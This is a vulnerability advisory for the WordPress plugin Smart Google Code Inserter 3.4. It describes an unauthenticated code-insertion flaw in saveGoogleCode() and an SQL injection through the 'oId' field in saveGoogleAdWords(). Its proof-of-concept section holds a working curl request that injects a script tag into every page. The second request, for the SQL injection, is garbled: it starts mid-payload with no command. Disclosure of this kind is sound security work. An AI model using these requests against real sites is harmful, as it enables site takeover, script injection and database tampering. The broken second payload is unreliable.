1. Product & Service Introduction:
==================================
Smart Google Code Inserter is a Wordpress plugin that makes it easy to add
Google Analytics tracking code as well as meta tag verification of
Webmaster Tools. As of now, the plugin has been downloaded 34,207 times and
has 9,000+ active installs.

2. Technical Details & Description:
===================================
Authentication Bypass vulnerability in the Smart Google Code Inserter
plugin 3.4 allows unauthenticated attackers to insert arbitrary javascript
or HTML code which runs on all pages served by Wordpress. The
saveGoogleCode() function in smartgooglecode.php does not check if the
current request is made by an authorized user, thus allowing any
unauthenticated user to successfully update the inserted code.

SQL Injection vulnerability, when coupled with the Authentication Bypass
vulnerability in the Smart Google Code Inserter plugin 3.4 allows
unauthenticated attackers to execute SQL queries in the context of the
webserver. The saveGoogleAdWords() function in smartgooglecode.php did not
use prepared statements and did not sanitize the $_POST["oId"] variable
before passing it as input into the SQL query.

3. Proof of Concept (PoC):
==========================

Code Insertion

curl -k -i --raw -X POST -d
"sgcgoogleanalytic=<script>alert("1");</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode"
"http://localhost/wp-admin/options-general.php?page=smartcode" -H "Host:
localhost" -H "Content-Type: application/x-www-form-urlencoded"

1=1--&ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" "
http://localhost/wp-admin/options-general.php?page=smartcode" -H "Host:
localhost" -H "Content-Type: application/x-www-form-urlencoded"
